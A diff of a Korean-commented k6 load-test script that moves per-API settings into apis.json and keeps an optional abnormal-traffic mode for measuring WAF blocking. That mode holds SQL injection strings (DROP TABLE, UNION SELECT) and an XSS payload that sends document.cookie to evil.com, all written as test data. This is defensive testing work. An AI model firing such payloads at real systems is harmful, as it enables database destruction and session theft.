@@ -1,37 +1,36 @@
 /**
- * k6 Load Test Script — 패턴 선택 + 비정상 트래픽 혼합 + 다중 API 독립 부하
+ * k6 Load Test Script — 다중 API 독립 부하 + 패턴 선택 + 비정상 트래픽
  *
- * PATTERN 환경변수로 트래픽 패턴 선택:
- *   rampup (기본) : 점진 증가 → 유지 → 감소
- *   step          : 계단식 증가
- *   spike         : 기준 트래픽 → 급등 → 복귀
+ * ── API 설정 (apis.json) ──────────────────────────────────────
+ * 프로젝트 루트의 apis.json 파일로 API별 개별 설정:
  *
- * 다중 API 독립 부하 (최대 3개):
- *   URL  (또는 URL1) : 첫 번째 대상 URL (default: http://localhost:8080/v1/stress)
- *   URL2             : 두 번째 대상 URL (선택)
- *   URL3             : 세 번째 대상 URL (선택)
- *   → 각 URL이 독립 시나리오로 실행되어 각각 RATE req/s 부하를 받음
- *   → URL 1개: RATE req/s / 2개: RATE×2 req/s / 3개: RATE×3 req/s
+ * [
+ *   {
+ *     "name": "상품 등록",              // 표시용 이름 (선택)
+ *     "url": "http://host/v1/product", // 대상 URL (필수)
+ *     "method": "POST",                // HTTP 메서드 (기본: POST)
+ *     "headers": { "Content-Type": "application/json" }, // 헤더 (선택)
+ *     "body": {                        // POST/PUT/PATCH body (선택)
+ *       "requestid": "{{requestid}}",  // 12자리 랜덤 숫자
+ *       "uuid": "{{uuid}}",            // UUID v4
+ *       "id": "item{{random6}}",       // 6자리 랜덤 숫자 접두어 가능
+ *       "price": "{{randomInt}}"       // 랜덤 정수 (단독 사용 시 number 타입)
+ *     },
+ *     "params": { ... },               // GET/DELETE query params (선택)
+ *     "expectedStatus": 201            // 기대 응답코드 (기본: 200)
+ *   }
+ * ]
  *
- * 비정상 트래픽:
- *   ABNORMAL_RATE : 전체 요청 중 비정상 요청 비율 (0~100, 기본 0)
+ * ── 템플릿 변수 ───────────────────────────────────────────────
+ *   {{requestid}}  → 12자리 랜덤 숫자 문자열 (예: "034581920374")
+ *   {{uuid}}       → UUID v4 (예: "7c5a3c6a-758f-4bc5-9bdf-3e573a0ad729")
+ *   {{random6}}    → 6자리 랜덤 숫자 (예: "500001")
+ *   {{randomInt}}  → 랜덤 정수 1000~9999 (단독 사용 시 number 타입 반환)
  *
- *   비정상 유형 (랜덤 선택):
- *     1. 빈 바디                 → 403 기대
- *     2. 필수 필드 누락           → 403 기대
- *     3. 잘못된 JSON             → 403 기대
- *     4. SQL 인젝션 패턴         → 403 기대
- *     5. XSS 패턴               → 403 기대
- *     6. 초대용량 페이로드        → 403 기대
- *     7. 잘못된 Content-Type     → 403 기대
- *     8. 존재하지 않는 경로       → 404 기대
- *
- * 공통 변수:
- *   URL / URL1    - 첫 번째 대상 URL (default: http://localhost:8080/v1/stress)
- *   URL2          - 두 번째 대상 URL (선택)
- *   URL3          - 세 번째 대상 URL (선택)
- *   RATE          - 각 API 피크 req/s (default: 56)
- *   ABNORMAL_RATE - 비정상 요청 비율 % (default: 0)
+ * ── 환경변수 (run.sh 또는 직접 설정) ─────────────────────────
+ *   RATE          - 각 API 피크 req/s (기본: 56)
+ *   PATTERN       - 트래픽 패턴: rampup | step | spike (기본: rampup)
+ *   ABNORMAL_RATE - 비정상 요청 비율 % (기본: 0)
  */
 
 import http from 'k6/http';
@@ -50,12 +49,12 @@ const RATE          = parseInt(__ENV.RATE          || '56');
 const PATTERN       = (__ENV.PATTERN     || 'rampup').toLowerCase();
 const ABNORMAL_RATE = parseInt(__ENV.ABNORMAL_RATE || '0');
 
-// ── 다중 URL 설정 (최대 3개) ───────────────────────────────────
-const TARGET_URLS = [
-  __ENV.URL || __ENV.URL1 || 'http://localhost:8080/v1/stress',
-  __ENV.URL2 || '',
-  __ENV.URL3 || '',
-].filter(u => u !== '');
+// ── API 설정 로드 (프로젝트 루트 apis.json) ────────────────────
+const TARGET_CONFIGS = JSON.parse(open('../apis.json'));
+
+if (!TARGET_CONFIGS || TARGET_CONFIGS.length === 0) {
+  throw new Error('apis.json에 API 설정이 없습니다. 최소 1개 이상의 API를 등록하세요.');
+}
 
 const INVALID_PATHS = ['/v1/none', '/v1/admin', '/v1/config', '/v1/unknown', '/v1/test'];
 
@@ -104,20 +103,26 @@ function buildStages() {
   ];
 }
 
-// ── URL별 독립 시나리오 생성 ───────────────────────────────────
-// 각 URL은 별도 시나리오로 실행 → 각각 RATE req/s 독립 부하
+// ── API별 독립 시나리오 생성 ───────────────────────────────────
+// apis.json의 각 항목이 독립 시나리오 → 각 API가 RATE req/s를 온전히 받음
 function buildScenarios() {
   const scenarios = {};
-  TARGET_URLS.forEach((url, i) => {
-    scenarios[`stress_test_url${i + 1}`] = {
+  TARGET_CONFIGS.forEach((cfg, i) => {
+    // 시나리오 키: 이름 기반 (공백/특수문자 제거)
+    const label = (cfg.name || `api${i + 1}`)
+      .replace(/\s+/g, '_')
+      .replace(/[^\w]/g, '')
+      .toLowerCase();
+
+    scenarios[`stress_${label}_${i + 1}`] = {
       executor:        'ramping-arrival-rate',
       startRate:       0,
       timeUnit:        '1s',
       preAllocatedVUs: 100,
       maxVUs:          500,
       stages:          buildStages(),
-      exec:            'runScenario',       // 모든 시나리오가 동일 함수 호출
-      env:             { SCENARIO_URL: url }, // 각 시나리오에 URL 개별 주입
+      exec:            'runScenario',
+      env:             { SCENARIO_INDEX: String(i) }, // 어떤 API 설정을 쓸지 인덱스로 전달
     };
   });
   return scenarios;
@@ -146,9 +151,86 @@ function generateRequestId() {
   return String(Math.floor(Math.random() * 1_000_000_000_000)).padStart(12, '0');
 }
 
-// URL에서 베이스 URL 추출 (존재하지 않는 경로 테스트용)
 function getBaseUrl(url) {
   return url.replace(/\/v\d+\/.*$/, '');
+}
+
+// ── 템플릿 치환 ───────────────────────────────────────────────
+// 값 전체가 단일 템플릿인 경우 → 적절한 타입으로 반환
+//   "price": "{{randomInt}}"   → 1234  (number)
+//   "id": "item{{random6}}"   → "item500001" (string)
+function resolveValue(val) {
+  if (typeof val !== 'string') return val; // number/boolean → 그대로
+
+  // 단일 템플릿 (값 전체) → 타입 보존
+  if (val === '{{requestid}}') return generateRequestId();                                              // string
+  if (val === '{{uuid}}')      return generateUUID();                                                   // string
+  if (val === '{{random6}}')   return String(Math.floor(Math.random() * 1_000_000)).padStart(6, '0'); // string
+  if (val === '{{randomInt}}') return Math.floor(Math.random() * 9000) + 1000;                        // number
+
+  // 혼합 문자열 → 인라인 치환 (결과는 항상 string)
+  return val
+    .replace(/\{\{requestid\}\}/g, () => generateRequestId())
+    .replace(/\{\{uuid\}\}/g,      () => generateUUID())
+    .replace(/\{\{random6\}\}/g,   () => String(Math.floor(Math.random() * 1_000_000)).padStart(6, '0'))
+    .replace(/\{\{randomInt\}\}/g, () => String(Math.floor(Math.random() * 9000) + 1000));
+}
+
+function resolveObject(obj) {
+  if (!obj) return null;
+  const result = {};
+  for (const [k, v] of Object.entries(obj)) {
+    result[k] = resolveValue(v);
+  }
+  return result;
+}
+
+// ── HTTP 요청 전송 ────────────────────────────────────────────
+function sendRequest(cfg) {
+  const method   = (cfg.method || 'POST').toUpperCase();
+  const headers  = Object.assign({ 'User-Agent': 'k6-load-test/1.0' }, cfg.headers || {});
+  const expected = cfg.expectedStatus || 200;
+
+  let url  = cfg.url;
+  let body = null;
+
+  if (method === 'GET' || method === 'DELETE') {
+    // Query string 구성
+    if (cfg.params) {
+      const resolved = resolveObject(cfg.params);
+      const qs = Object.entries(resolved)
+        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
+        .join('&');
+      url = `${url}?${qs}`;
+    }
+  } else {
+    // Request body 구성 (POST / PUT / PATCH)
+    if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
+    if (cfg.body) {
+      body = JSON.stringify(resolveObject(cfg.body));
+    }
+  }
+
+  let res;
+  switch (method) {
+    case 'GET':    res = http.get(url,          { headers, tags: { target_url: cfg.url } }); break;
+    case 'POST':   res = http.post(url,   body, { headers, tags: { target_url: cfg.url } }); break;
+    case 'PUT':    res = http.put(url,    body, { headers, tags: { target_url: cfg.url } }); break;
+    case 'PATCH':  res = http.patch(url,  body, { headers, tags: { target_url: cfg.url } }); break;
+    case 'DELETE': res = http.del(url,    body, { headers, tags: { target_url: cfg.url } }); break;
+    default:
+      console.error(`[ERROR] 지원하지 않는 HTTP 메서드: ${method}`);
+      return;
+  }
+
+  check(res, {
+    [`HTTP ${expected}`]:  (r) => r.status === expected,
+    'latency < 500ms':     (r) => r.timings.duration < 500,
+  });
+
+  customLatency.add(res.timings.duration);
+  customSuccess.add(res.status === expected);
+  customTotal.add(1);
 }
 
 // ── 비정상 요청 유형명 ────────────────────────────────────────
@@ -163,12 +245,12 @@ const ABNORMAL_TYPE_NAMES = [
   '존재하지 않는 경로',
 ];
 
-// ── 비정상 요청 전송 ──────────────────────────────────────────
-function sendAbnormalRequest(targetUrl) {
+// ── 비정상 요청 전송 (해당 시나리오 API 대상) ──────────────────
+function sendAbnormalRequest(cfg) {
   const typeIdx = Math.floor(Math.random() * 8);
-  const baseUrl = getBaseUrl(targetUrl);
+  const baseUrl = getBaseUrl(cfg.url);
 
-  let url            = targetUrl;
+  let url            = cfg.url;
   let payload        = '';
   let expectedStatus = 403;
   const headers      = {
@@ -177,41 +259,24 @@ function sendAbnormalRequest(targetUrl) {
   };
 
   switch (typeIdx) {
-    case 0:
-      // 빈 바디
-      payload = '';
-      break;
-
-    case 1:
-      // 필수 필드 누락 (requestid, uuid 없음)
-      payload = JSON.stringify({ length: 256 });
-      break;
-
-    case 2:
-      // 잘못된 JSON 형식
-      payload = '{bad:json,missing:quotes}';
-      break;
-
+    case 0: payload = ''; break;
+    case 1: payload = JSON.stringify({ length: 256 }); break;
+    case 2: payload = '{bad:json,missing:quotes}'; break;
     case 3:
-      // SQL 인젝션 패턴
       payload = JSON.stringify({
         requestid: "' OR '1'='1'; DROP TABLE users--",
         uuid:      "' UNION SELECT * FROM information_schema.tables--",
         length:    256,
       });
       break;
-
     case 4:
-      // XSS 패턴
       payload = JSON.stringify({
         requestid: '<script>alert(document.cookie)</script>',
         uuid:      '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>',
         length:    256,
       });
       break;
-
     case 5:
-      // 초대용량 페이로드 (10KB)
       payload = JSON.stringify({
         requestid: generateRequestId(),
         uuid:      generateUUID(),
@@ -219,28 +284,20 @@ function sendAbnormalRequest(targetUrl) {
         padding:   'X'.repeat(10240),
       });
       break;
-
     case 6:
-      // 잘못된 Content-Type
       headers['Content-Type'] = 'text/plain';
       payload = `requestid=${generateRequestId()}&uuid=${generateUUID()}`;
       break;
-
     case 7:
-      // 존재하지 않는 경로 → 404 기대
       url = baseUrl + INVALID_PATHS[Math.floor(Math.random() * INVALID_PATHS.length)];
-      payload = JSON.stringify({
-        requestid: generateRequestId(),
-        uuid:      generateUUID(),
-        length:    256,
-      });
+      payload = JSON.stringify({ requestid: generateRequestId(), uuid: generateUUID(), length: 256 });
       expectedStatus = 404;
       break;
   }
 
   const res = http.post(url, payload, {
     headers,
-    tags: { request_type: 'abnormal', target_url: targetUrl },
+    tags: { request_type: 'abnormal', target_url: cfg.url },
   });
 
   const blocked = res.status === expectedStatus;
@@ -249,7 +306,6 @@ function sendAbnormalRequest(targetUrl) {
     [`비정상 차단 (${expectedStatus})`]: (r) => r.status === expectedStatus,
   });
 
-  // 차단 실패 시 어떤 유형이 통과됐는지 로그 출력
   if (!blocked) {
     console.warn(
       `[차단 실패] 유형: ${ABNORMAL_TYPE_NAMES[typeIdx]}` +
@@ -263,43 +319,16 @@ function sendAbnormalRequest(targetUrl) {
   wafBlockRate.add(blocked);
 }
 
-// ── 정상 요청 전송 ────────────────────────────────────────────
-function sendNormalRequest(targetUrl) {
-  const payload = JSON.stringify({
-    requestid: generateRequestId(),
-    uuid:      generateUUID(),
-    length:    256,
-  });
-
-  const res = http.post(targetUrl, payload, {
-    headers: {
-      'Content-Type': 'application/json',
-      'User-Agent':   'k6-load-test/1.0',
-    },
-    tags: { request_type: 'normal', target_url: targetUrl },
-  });
-
-  check(res, {
-    'HTTP 200':        (r) => r.status === 200,
-    'latency < 500ms': (r) => r.timings.duration < 500,
-  });
-
-  const httpOk = res.status >= 200 && res.status < 300;
-  customLatency.add(res.timings.duration);
-  customSuccess.add(httpOk);
-  customTotal.add(1);
-}
-
 // ── 시나리오 실행 함수 ────────────────────────────────────────
-// 각 URL별 독립 시나리오에서 호출됨
-// __ENV.SCENARIO_URL : 해당 시나리오에 주입된 개별 URL
+// __ENV.SCENARIO_INDEX → apis.json의 몇 번째 항목을 사용할지 결정
 export function runScenario() {
-  const url = __ENV.SCENARIO_URL;
+  const idx = parseInt(__ENV.SCENARIO_INDEX);
+  const cfg = TARGET_CONFIGS[idx];
 
   if (ABNORMAL_RATE > 0 && Math.random() * 100 < ABNORMAL_RATE) {
-    sendAbnormalRequest(url);
+    sendAbnormalRequest(cfg);
   } else {
-    sendNormalRequest(url);
+    sendRequest(cfg);
   }
 }
 
@@ -311,33 +340,38 @@ export function handleSummary(data) {
   const abnormal = data.metrics.stress_abnormal_requests;
   const waf      = data.metrics.stress_waf_block_rate;
 
-  const rps           = reqs     ? reqs.values.rate.toFixed(2)           : 'N/A';
-  const p90           = dur      ? dur.values['p(90)'].toFixed(2)         : 'N/A';
-  const p99           = dur      ? dur.values['p(99)'].toFixed(2)         : 'N/A';
-  const failRate      = fails    ? (fails.values.rate * 100).toFixed(2)   : 'N/A';
-  const abnormalCount = abnormal ? abnormal.values.count                  : 0;
-  const wafRate       = waf      ? (waf.values.rate * 100).toFixed(2)     : 'N/A';
+  const rps      = reqs  ? reqs.values.rate.toFixed(2)         : 'N/A';
+  const p90      = dur   ? dur.values['p(90)'].toFixed(2)      : 'N/A';
+  const p99      = dur   ? dur.values['p(99)'].toFixed(2)      : 'N/A';
+  const failRate = fails ? (fails.values.rate * 100).toFixed(2): 'N/A';
+  const abnCnt   = abnormal ? abnormal.values.count            : 0;
+  const wafRate  = waf   ? (waf.values.rate * 100).toFixed(2) : 'N/A';
 
-  const urlCount   = TARGET_URLS.length;
-  const urlSection = urlCount > 1
-    ? `\n  대상 URL (${urlCount}개 — 각각 ${RATE} req/s 독립 부하):\n` +
-      TARGET_URLS.map((u, i) => `    URL${i + 1}: ${u}`).join('\n') +
-      `\n  총 최대 RPS     : ~${RATE * urlCount} req/s`
-    : `\n  대상 URL  : ${TARGET_URLS[0]}`;
+  const apiList = TARGET_CONFIGS
+    .map((c, i) => {
+      const method = (c.method || 'POST').toUpperCase();
+      const name   = c.name ? `  (${c.name})` : '';
+      const status = c.expectedStatus || 200;
+      return `    ${i + 1}. [${method}] ${c.url} → ${status}${name}`;
+    })
+    .join('\n');
 
-  const abnormalSection = ABNORMAL_RATE > 0 ? `
+  const abnSection = ABNORMAL_RATE > 0 ? `
   ── 비정상 트래픽 ─────────────────────────────
-  비정상 요청 수  : ${abnormalCount} 건
+  비정상 요청 수  : ${abnCnt} 건
   WAF 차단 성공률 : ${wafRate} %` : '';
 
   console.log(`
 ══════════════════════════════════════════════
   k6 테스트 완료  [패턴: ${PATTERN.toUpperCase()}]
-══════════════════════════════════════════════${urlSection}
+══════════════════════════════════════════════
+  대상 API (${TARGET_CONFIGS.length}개 — 각각 ${RATE} req/s 독립 부하):
+${apiList}
+  총 최대 RPS     : ~${RATE * TARGET_CONFIGS.length} req/s
   RPS (전체 합계) : ${rps} req/s
   P90 latency     : ${p90} ms
   P99 latency     : ${p99} ms
-  Error rate      : ${failRate} %${abnormalSection}
+  Error rate      : ${failRate} %${abnSection}
 ══════════════════════════════════════════════`);
 
   return {};
